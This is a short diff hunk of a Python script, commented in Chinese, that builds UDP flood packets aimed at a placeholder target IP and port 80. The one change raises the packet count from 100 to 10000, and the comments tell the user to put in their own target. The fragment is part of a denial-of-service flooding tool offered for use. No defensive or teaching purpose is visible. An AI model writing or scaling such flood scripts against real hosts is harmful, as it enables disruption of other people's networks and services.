@@ -6,7 +6,7 @@ target_ip = "10.0.0.2"  # 示例IP，请替换成你的目标IP
 target_port = 80  # 示例端口，请根据需要修改
 
 # 构造UDP洪水包
-packet_count = 100  # 发送包的数量，根据需要调整
+packet_count = 10000  # 发送包的数量，根据需要调整
 packets = []
 
 for i in range(packet_count):
